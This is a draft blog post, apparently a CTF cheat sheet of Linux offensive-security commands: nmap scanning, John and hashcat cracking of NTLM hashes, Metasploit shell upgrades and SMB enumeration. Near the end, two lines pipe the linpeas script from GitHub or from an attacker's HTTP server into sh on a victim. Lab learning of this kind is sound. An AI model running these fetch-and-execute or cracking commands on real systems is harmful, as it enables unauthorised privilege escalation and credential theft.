---
title: Linux Commands for Hacking and Security
date: 2023-08-08
author: Abhinav Kumar
image: {
  src: "/images/bash.jpeg",
  alt: "Bash for Hackers",
}
description: Linux commands and shortcuts very often used by Hackers, Security professionals, CTF Players.
draft: true
category: Hacking 101
---

Linux commands that are often used by hackers, security professional and CTF players. We will avoid any payloads or oneliner exploits ( will cover in different page sometime).

### Add Target to hosts file

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ echo '10.10.196.20 blue.thm' | sudo tee -a /etc/hosts
[sudo] password for abhinav: 
10.10.196.20 blue.thm
```

### Nmap

```bash
sudo nmap -sC -sV -p- -T5 -Pn targethost
sudo nmap -sU -sV -p- -T5 -Pn targethost
```

Start Metasploit with database



Cracking hash with John

```bash
──(abhinav㉿ETHICALHACKX)-[~]
└─$ john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
```

Cracking hash with hashcat

Windows NTLM Hash
```bash
hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt.gz
```

Metasploit Shell Upgrade to Meterpreter
sessions -u 3
sessions -u -1
use post/multi/manage/shell_to_meterpreter
run session=-1


## Extract Files

Gz Files

gunzip archive.gz

```bash
tar –xvzf archive.tar.gz
```

## SSH Connection 

ssh username@host -oHostKeyAlgorithms=+ssh-dss


## Text Filter

grep -i ]- inlcude
grep -v ]- exclude

## SMB Enumeration

nmap

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.232.56
```

```bash
smbclient //IP/directory
```

mount NFS

make directory locally and mount it
```bash
mkdir /mnt/sampleDIR
sudo mount IP:/folder /mnt/sampleDIR
```
## netcat

get version via banner
nc IP port

## Linpeas

# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Python Simple HTTP Server


python3 -m http.server 7777
curl 10.10.10.10/linpeas.sh | sh #Victim

### Wordpress CMS Vulnerabilty Scanning

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks
```